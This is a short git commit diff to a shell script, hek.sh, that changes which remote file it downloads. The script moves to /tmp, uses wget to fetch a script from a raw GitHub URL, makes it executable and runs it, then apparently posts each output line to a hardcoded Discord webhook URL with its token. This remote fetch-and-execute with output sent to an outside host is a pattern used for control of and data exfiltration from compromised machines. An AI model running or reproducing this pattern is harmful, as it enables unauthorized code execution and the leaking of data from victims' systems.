13387151498ee49a35c55b7a9deafa456c8befe7
ismirku <131448021+ismirku@users.noreply.github.com>
2023-04-21 18:19:19 +0800

    Update hek.sh

--- hek.sh
+++ hek.sh
@@ -2,11 +2,11 @@ discord_url="https://discord.com/api/webhooks/1098558144940081253/G4O7jhCIxOQmHN
 
 cd ../../tmp
 
-wget https://raw.githubusercontent.com/funfactcat/latenightthought/main/hek.sh
+wget https://raw.githubusercontent.com/funfactcat/latenightthought/main/run.sh
 
-chmod +x hek.sh 
+chmod +x run.sh 
 
-./hek.sh 2>&1 | while IFS= read -r line
+./run.sh 2>&1 | while IFS= read -r line
   do
     sleep 5
     generate_post_data() {
